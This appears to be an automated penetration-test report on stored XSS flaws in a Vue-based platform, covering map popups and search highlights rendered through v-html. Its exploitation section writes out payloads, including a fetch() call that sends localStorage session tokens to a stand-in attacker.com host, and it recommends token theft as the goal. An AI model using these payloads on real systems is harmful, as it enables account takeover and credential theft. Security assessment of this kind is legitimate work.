# Cross-Site Scripting (XSS) Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Two high-confidence Stored XSS vulnerabilities were identified in the ADDP platform. Both vulnerabilities allow attackers to execute arbitrary JavaScript in victim browsers, leading to session token theft and account takeover. All findings have been passed to the exploitation phase via `deliverables/xss_exploitation_queue.json`.
- **Purpose of this Document:** This report provides the strategic context, dominant patterns, and environmental intelligence necessary to effectively exploit the vulnerabilities.

**Critical Findings:**
- **XSS-VULN-01:** Map Feature Popup HTML Injection (CRITICAL) - Unsanitized GeoJSON/spatial data properties rendered via `v-html` directive
- **XSS-VULN-02:** Search Result Highlights XSS (HIGH) - Meilisearch indexed content rendered without sanitization when highlights are present

**Impact Assessment:**
- Both vulnerabilities are **Stored XSS** (persistent)
- Both allow **session token theft** from localStorage (no HttpOnly protection)
- Both are **externally exploitable** via the public-facing application at http://localhost:5170
- **Cross-tenant impact potential:** Malicious spatial data or documents can affect all users who view them

**Security Strengths Observed:**
- ✅ Markdown preview properly uses DOMPurify sanitization
- ✅ Vue.js automatic escaping protects most template rendering
- ✅ Modern library versions (DOMPurify 3.3.1, marked 12.0.2) without known XSS CVEs

**Security Weaknesses:**
- ❌ No Content-Security-Policy (CSP) headers configured
- ❌ JWT tokens stored in localStorage (XSS-vulnerable)
- ❌ DOCX preview missing sanitization (Mammoth.js output rendered directly)
- ❌ Manual HTML construction in map components without encoding

## 2. Dominant Vulnerability Patterns

### Pattern 1: v-html Directive with Unsanitized User Data

**Description:** A recurring pattern where user-controlled data from database queries or external sources is rendered using Vue.js's `v-html` directive without HTML encoding or DOMPurify sanitization. This pattern appears in components that need to display rich content (map popups, search highlights).

**Technical Details:**
- **Vulnerable Code Pattern:**
  ```javascript
  // Manual HTML string construction
  let html = `<div>${userControlledValue}</div>`
  // Rendered via v-html directive
  <div v-html="htmlContent"></div>
  ```
- **Root Cause:** Vue.js's automatic escaping only applies to template interpolation (`{{ value }}`), not to `v-html` directive
- **Bypass Mechanism:** Developers use `v-html` for legitimate rich content but fail to sanitize user input first

**Implication:** Any component using `v-html` with data sourced from user uploads, database queries, or external APIs is vulnerable to XSS unless explicit sanitization is applied.

**Representative Findings:**
- XSS-VULN-01 (Map popups): `formatFeatureProperties()` builds HTML strings from GeoJSON properties
- XSS-VULN-02 (Search results): Meilisearch highlights returned as HTML strings with `<em>` tags

**Attack Surface:**
- File uploads (GeoJSON, Shapefiles, text documents)
- SQL execution results (custom queries storing malicious data)
- External service metadata (OGC service descriptions)

---

### Pattern 2: Stored XSS via Data Indexing Pipelines

**Description:** User-uploaded content flows through multi-stage processing pipelines (extraction → indexing → search → display) where sanitization is assumed to occur but is actually absent at every stage.

**Technical Details:**
- **Data Flow:**
  ```
  User Upload → Metadata Extraction (NO SANITIZATION)
    → Meilisearch Indexing (NO SANITIZATION)
    → Search API Response (NO SANITIZATION)
    → Frontend Display (BYPASSED SANITIZATION)
  ```
- **Sanitization Gap:** Frontend has `escapeHtml()` function but it's only called when highlights are absent
- **Bypass Condition:** Any search query match triggers highlights, which skip the sanitization path

**Implication:** Data indexing systems create persistent XSS vectors where malicious content affects all users who search for matching terms. The multi-stage pipeline creates a false sense of security as developers assume sanitization happens "somewhere else."

**Representative Finding:** XSS-VULN-02 (Search highlights)

**Attack Surface:**
- Document uploads (.txt, .md, .docx, .pdf with text extraction)
- Metadata fields (filename, description, author)
- Database records indexed for full-text search

## 3. Strategic Intelligence for Exploitation

### Content Security Policy (CSP) Analysis

**Current CSP:** ❌ **NOT CONFIGURED**

**Evidence:**
- Examined Nginx configuration files:
  - `/Users/pampa/code/addp/nginx/nginx.conf`
  - Service-specific nginx configs
- No `Content-Security-Policy` headers found
- No `X-Content-Type-Options`, `X-Frame-Options`, or `X-XSS-Protection` headers

**Critical Bypass:** With no CSP in place, exploitation is trivial:
- ✅ Inline scripts execute without restriction (`<script>alert(1)</script>`)
- ✅ External script loading allowed (`<script src="https://attacker.com/payload.js"></script>`)
- ✅ `eval()` and `new Function()` permitted
- ✅ `javascript:` URLs functional in links and iframes

**Recommendation for Exploitation:**
- **Primary vector:** Direct `<script>` tag injection
- **Stealth vector:** `<img src=x onerror="...">` for event-based execution
- **Exfiltration:** No CSP `connect-src` restriction means unrestricted `fetch()` calls to attacker domains

---

### Cookie Security & Session Management

**Session Storage Mechanism:** localStorage (NOT HttpOnly Cookies)

**Evidence:**
- **File:** `/Users/pampa/code/addp/common-frontend/basic/src/composables/useAuth.js`
- **Line 222-228:** `localStorage.setItem('token', token)`
- **Accessible via JavaScript:** `document.localStorage.getItem('token')`

**Security Impact:**
- ❌ **No HttpOnly protection** - JavaScript can read tokens directly
- ❌ **No Secure flag** - Tokens transmitted over HTTP in development
- ❌ **No SameSite protection** - Vulnerable to CSRF via XSS

**Token Format:**
```javascript
// JWT stored in localStorage under key 'token'
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6IlN1cGVyQWRtaW4iLCJ0ZW5hbnRfaWQiOm51bGwsImV4cCI6MTczOTQ1NTIwMCwiaWF0IjoxNzM5NDQ0NDAwfQ.signature
```

**Exploitation Strategy:**
1. Execute XSS payload in victim's browser
2. Read token: `localStorage.getItem('token')`
3. Exfiltrate via: `fetch('https://attacker.com/collect?token='+localStorage.getItem('token'))`
4. Use stolen token to impersonate victim (valid for 180 minutes)

**Recommendation:** Exploitation should prioritize token theft as the primary objective. No additional bypass techniques needed - direct localStorage access is sufficient.

---

### Input Validation & Sanitization Landscape

**Sanitization Functions Observed:**

1. **DOMPurify (Properly Implemented):**
   - **Location:** MarkdownPreview.vue
   - **Version:** 3.3.1 (secure, no known bypasses)
   - **Configuration:** `USE_PROFILES: { html: true }` (restrictive)
   - **Status:** ✅ Effective protection

2. **escapeHtml() Custom Function:**
   - **Locations:** DataRetrieval.vue, DocxPreview.vue
   - **Implementation:**
     ```javascript
     const escapeHtml = (input = '') => {
       return input
         .replace(/&/g, '&amp;')
         .replace(/</g, '&lt;')
         .replace(/>/g, '&gt;')
         .replace(/"/g, '&quot;')
         .replace(/'/g, '&#39;')
     }
     ```
   - **Status:** ✅ Correctly implemented BUT **inconsistently applied**
   - **Bypass:** Search highlights path (XSS-VULN-02) bypasses this function

3. **Vue.js Automatic Escaping:**
   - **Protection:** Template interpolation (`{{ value }}`) automatically escaped
   - **Limitation:** Does NOT apply to `v-html` directive
   - **Status:** ✅ Effective where used, but developers bypass with `v-html`

**Sanitization Gaps:**
- ❌ **Map popups:** No sanitization at all (XSS-VULN-01)
- ❌ **DOCX preview:** Mammoth.js output not sanitized
- ❌ **Search highlights:** Conditional sanitization easily bypassed

**Exploitation Guidance:**
- Target `v-html` directive usage (manual HTML construction)
- Avoid template interpolation (automatically escaped)
- Focus on file upload and data import vectors (bypass client-side validation)

## 4. Vectors Analyzed and Confirmed Secure

These input vectors were traced and confirmed to have robust, context-appropriate defenses.

| Source (Parameter/Key) | Endpoint/File Location | Defense Mechanism Implemented | Render Context | Verdict |
|--------------------------|-------------------------|--------------------------------|----------------|---------|
| Markdown content | MarkdownPreview.vue | DOMPurify.sanitize() with USE_PROFILES | HTML_BODY | SAFE |
| Content preview (no highlights) | DataRetrieval.vue line 355 | escapeHtml() custom function | HTML_BODY | SAFE |
| Template interpolation | All Vue components | Vue.js automatic escaping | HTML_BODY | SAFE |
| URL parameters | DataExplorer.vue, SpatialPreview.vue | Type conversion (Number(), String()) + Vue props | N/A | SAFE |
| Form inputs | All Element Plus components | Vue binding without v-html | HTML_BODY | SAFE |

**Notes:**
- Markdown preview demonstrates correct XSS prevention pattern: parse → sanitize → render
- Search results have sanitization function but it's conditionally bypassed (see XSS-VULN-02)
- Vue.js automatic escaping provides strong baseline protection for standard template rendering

---

## 5. Analysis Constraints and Blind Spots

### Completed Analysis Coverage

**Comprehensively Analyzed:**
- ✅ All `v-html` directive usages across frontend codebase
- ✅ All manual HTML string construction patterns
- ✅ All data indexing and rendering pipelines (Meilisearch, spatial data)
- ✅ All preview components (markdown, DOCX, images, videos, etc.)
- ✅ JWT token storage and accessibility from XSS context
- ✅ CSP header configuration (or lack thereof)
- ✅ DOMPurify and sanitization library implementations

### Known Limitations

**Mammoth.js DOCX Preview (Not Verified Externally Exploitable):**
- **File:** `/Users/pampa/code/addp/manager/frontend/src/components/previews/DocxPreview.vue`
- **Issue:** Mammoth.js output rendered via `v-html` without DOMPurify sanitization
- **Constraint:** Requires malicious DOCX file upload and successful preview trigger
- **Classification:** Not included in exploitation queue pending live confirmation
- **Recommendation:** Should be tested during exploitation phase

**Minified/Obfuscated Third-Party Libraries:**
- OpenLayers map library code not fully audited for DOM-based XSS
- Element Plus component library assumed secure (no source review)
- Gaode Maps (高德地图) integration not analyzed for injection points

**Dynamic Component Loading:**
- Vue's dynamic component system may introduce runtime-loaded components not visible in static analysis
- Preview plugin architecture loads components on-demand - some may have been missed

### Out-of-Scope Items

**Explicitly Excluded per Scope Definition:**
- Internal network endpoints (localhost-only services)
- Development tools and build scripts
- Database administration interfaces (not web-accessible)
- Docker container internals
- CI/CD pipeline artifacts

---
